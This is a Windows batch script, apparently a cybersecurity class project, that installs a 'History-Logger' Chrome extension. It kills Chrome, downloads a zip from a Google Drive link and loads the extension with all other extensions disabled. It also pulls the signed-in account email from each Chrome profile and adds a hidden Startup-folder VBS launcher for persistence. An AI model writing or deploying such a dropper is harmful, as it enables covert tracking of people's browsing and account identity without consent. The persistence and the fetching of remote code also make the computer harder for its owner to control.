@echo off
setlocal EnableDelayedExpansion

echo ==================================================
echo  CyberSec Final Project: History-Logger Extension
echo ==================================================

REM 0) Kill all Chrome processes
echo [!] Closing all Chrome instances...
taskkill /IM chrome.exe /F >nul 2>&1
if errorlevel 1 (
  echo   No Chrome processes found.
) else (
  echo   Chrome processes terminated.
)
timeout /t 3 /nobreak >nul

REM 1) Configuration
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "SCRIPT_DIR=%~dp0"
set "WORKDIR=%SCRIPT_DIR%history-logger"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo.
echo [Step 1] Preparing work folder: "%WORKDIR%"
if exist "%WORKDIR%" (
  echo   Deleting existing folder...
  rd /s /q "%WORKDIR%" || (
    echo   ERROR: Could not delete "%WORKDIR%"
    pause
    goto :end
  )
)
mkdir "%WORKDIR%" || (
  echo   ERROR: Could not create "%WORKDIR%"
  pause
  goto :end
)

echo.
echo [Step 2] Downloading extension.zip from Drive...
powershell -NoProfile -Command ^
  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing"
if errorlevel 1 (
  echo   ERROR: Download failed.
  pause
  goto :end
)

echo.
echo [Step 3] Extracting ext.zip...
powershell -NoProfile -Command ^
  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force"
if errorlevel 1 (
  echo   ERROR: Unpacking failed.
  pause
  goto :end
)

echo.
echo [Step 4] Scanning Chrome profiles for signed-in email...
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`^
      powershell -NoProfile -Command ^
        "try { (Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email } catch { '' }"`
    ) do (
      if not "%%E"=="" (
        set "EMAIL=%%E"
        set "PROFILE_DIR=%%P"
        echo   Found email in profile "%%~nP": !EMAIL!
        goto :found_email
      )
    )
  )
)
:found_email
if not defined EMAIL (
  set "EMAIL=anonymous@demo.com"
  set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
  echo   No email found - defaulting to !EMAIL!
)

echo.
echo [Step 5] Writing config.json...
(
  echo {"userEmail":"!EMAIL!"}
) > "%WORKDIR%\config.json" || (
  echo   ERROR: Failed to write config.json
  pause
  goto :end
)
echo   config.json contents:
type "%WORKDIR%\config.json"

echo.
echo [Step 6] Registering script in Startup...
echo Set WShell = CreateObject("WScript.Shell") > "%STARTUP_DIR%\run_extension.vbs"
echo WShell.Run chr(34) ^& "%~f0" ^& chr(34), 0 >> "%STARTUP_DIR%\run_extension.vbs"
if errorlevel 1 (
  echo   ERROR: Failed to register in Startup.
  pause
  goto :end
)
echo   Script registered to run at startup.

echo.
echo [Step 7] Launching Chrome with extension...
start "" chrome.exe --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%"
if errorlevel 1 (
  echo   ERROR: Failed to launch Chrome.
  pause
  goto :end
)

:end
echo.
echo [DONE] Extension setup complete.
echo If the extension did not load, open chrome://extensions and click "Load unpacked" at:
echo    %WORKDIR%
pause
